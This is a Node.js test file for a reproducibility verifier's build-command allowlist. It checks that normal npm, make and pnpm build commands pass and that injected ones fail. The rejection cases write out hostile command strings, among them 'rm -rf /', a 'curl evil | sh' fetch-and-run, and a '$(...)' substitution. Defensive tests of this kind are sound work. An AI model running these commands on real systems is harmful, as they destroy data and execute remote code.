// SEC-004 — the repro verifier's BUILD allowlist must accept the SHIPPED config buildCommand
// (config/verifier cannot drift), and an allowlist rejection / build failure must be NON-SCORING,
// not warn=15pts.

import { describe, it } from "node:test";
import assert from "node:assert/strict";
import fs from "node:fs";
import path from "node:path";
import { fileURLToPath } from "node:url";

import { isBuildCommandAllowed } from "../repro/scripts/verify-repro.mjs";

const HERE = path.dirname(fileURLToPath(import.meta.url));
const SHIPPED_CONFIG = path.join(HERE, "..", "repro", "config.json");

describe("SEC-004 build allowlist", () => {
  it("the SHIPPED verifiers/repro/config.json buildCommand passes its own allowlist", () => {
    const cfg = JSON.parse(fs.readFileSync(SHIPPED_CONFIG, "utf8"));
    assert.ok(
      isBuildCommandAllowed(cfg.buildCommand),
      `shipped buildCommand "${cfg.buildCommand}" must be allowlisted (config/verifier must not drift)`
    );
  });

  it("accepts the canonical npm pack pipeline", () => {
    assert.ok(isBuildCommandAllowed("npm ci && npm run build && npm pack"));
  });

  it("accepts simple single-step commands", () => {
    assert.ok(isBuildCommandAllowed("npm run build"));
    assert.ok(isBuildCommandAllowed("make build"));
    assert.ok(isBuildCommandAllowed("pnpm install && pnpm build"));
  });

  it("rejects a command with shell injection metacharacters", () => {
    assert.equal(isBuildCommandAllowed("npm run build; rm -rf /"), false);
    assert.equal(isBuildCommandAllowed("npm run build && curl evil | sh"), false);
    assert.equal(isBuildCommandAllowed("npm run build && $(echo pwned)"), false);
  });

  it("rejects an unknown verb", () => {
    assert.equal(isBuildCommandAllowed("python setup.py install"), false);
    assert.equal(isBuildCommandAllowed("npm run postinstall-evil"), false);
  });

  it("rejects empty / non-string", () => {
    assert.equal(isBuildCommandAllowed(""), false);
    assert.equal(isBuildCommandAllowed("   "), false);
    assert.equal(isBuildCommandAllowed(undefined), false);
  });
});
